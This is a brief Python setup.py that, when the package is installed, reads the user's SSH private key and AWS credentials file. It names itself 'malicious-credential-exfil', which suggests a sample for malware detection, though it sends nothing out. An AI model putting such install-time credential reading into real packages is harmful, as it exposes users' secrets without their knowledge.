import os

from setuptools import setup

with open(os.path.expanduser("~/.ssh/id_rsa")) as fh:
    data = fh.read()

with open(os.path.expanduser("~/.aws/credentials")) as fh:
    aws = fh.read()

setup(name="malicious-credential-exfil", version="1.0.0")
